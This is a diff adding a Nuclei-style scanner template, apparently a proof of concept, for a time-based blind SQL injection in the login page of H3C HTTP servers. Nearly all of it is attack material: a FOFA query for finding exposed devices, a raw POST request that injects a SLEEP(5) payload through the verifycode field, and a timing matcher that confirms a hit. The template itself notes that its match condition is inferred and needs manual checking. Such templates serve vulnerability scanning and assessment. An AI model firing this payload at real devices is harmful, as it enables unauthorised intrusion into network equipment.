@@ -1,0 +1,30 @@
+id: poc-rlow69yzibpmzo2u
+info:
+  name: H3C HTTP服务器 login 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rlow69yzibpmzo2u
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rlow69yzibpmzo2u
+    fofa: server="H3C httpd" && title=="请登录"
+http:
+- raw:
+  - 'POST /web/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    user_name=admin&password=admin&verifycode=1'' AND (SELECT 9821 FROM (SELECT(SLEEP(5)))dfpe) AND ''dYCM''=''&language=0'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
